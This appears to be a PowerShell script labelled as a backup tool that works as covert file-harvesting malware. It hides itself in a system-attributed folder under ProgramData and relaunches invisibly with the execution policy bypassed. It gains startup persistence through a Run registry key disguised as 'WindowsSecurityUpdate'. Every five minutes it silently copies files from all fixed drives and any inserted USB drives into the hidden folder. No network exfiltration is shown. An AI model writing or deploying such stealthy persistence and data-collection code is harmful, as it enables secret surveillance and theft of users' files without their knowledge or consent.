# Define the hidden storage path in a less-restricted area
$hiddenPath = "C:\ProgramData\Backup"
$scriptPath = "$hiddenPath\backup.ps1"

# Ensure the folder exists and is hidden
if (!(Test-Path $hiddenPath)) {
    New-Item -ItemType Directory -Path $hiddenPath -Force | Out-Null
    # Hide the directory by setting Hidden and System attributes
    attrib +h +s $hiddenPath
}

# Move the script to the hidden location (if not already there)
if ($PSCommandPath -ne $scriptPath) {
    Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
    attrib +h +s $scriptPath  # Hide the script file
    Start-Sleep -Seconds 2
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PassThru
    exit  # Exit the original script to hide execution
}

# Add registry key for persistence (auto-run at startup)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsSecurityUpdate"
$regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
}

# Function to copy only new/modified files from source to destination
function Copy-UpdatedFiles {
    param (
        [string]$source,
        [string]$destination
    )
    try {
        Get-ChildItem -Path $source -Recurse -Force -ErrorAction SilentlyContinue | 
        Where-Object { -not $_.PSIsContainer } | 
        ForEach-Object {
            $destFile = Join-Path -Path $destination -ChildPath $_.FullName.Substring($source.Length)
            $destFolder = Split-Path -Parent $destFile
            if (!(Test-Path $destFolder)) { 
                New-Item -ItemType Directory -Path $destFolder -Force | Out-Null 
            }
            # Copy file if it doesn't exist or if it has been modified
            if (!(Test-Path $destFile) -or ((Get-Item $_.FullName).LastWriteTime -gt (Get-Item $destFile -ErrorAction SilentlyContinue).LastWriteTime)) {
                Copy-Item -Path $_.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {
        Write-Host "Error copying files: $_"
    }
}

# Drives to monitor (adjust as necessary)
$drives = @("C:", "D:", "E:", "F:", "G:", "H:")

# Infinite loop to keep the script running in the background
while ($true) {
    foreach ($drive in $drives) {
        if (Test-Path $drive) {
            $backupPath = "$hiddenPath\$($drive.Replace(':',''))"
            Copy-UpdatedFiles -source $drive -destination $backupPath
        }
    }

    # Detect and copy files from USB drives (DriveType 2 indicates removable drives)
    $usbDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    foreach ($usb in $usbDrives) {
        $usbPath = $usb.DeviceID + "\"
        $backupUsbPath = "$hiddenPath\USB_$($usb.DeviceID.Replace(':',''))"
        Copy-UpdatedFiles -source $usbPath -destination $backupUsbPath
    }

    # Reapply hidden and system attributes in case they change
    attrib +h +s $hiddenPath -Force

    # Wait 5 minutes (300 seconds) before running the next backup cycle
    Start-Sleep -Seconds 300
} 
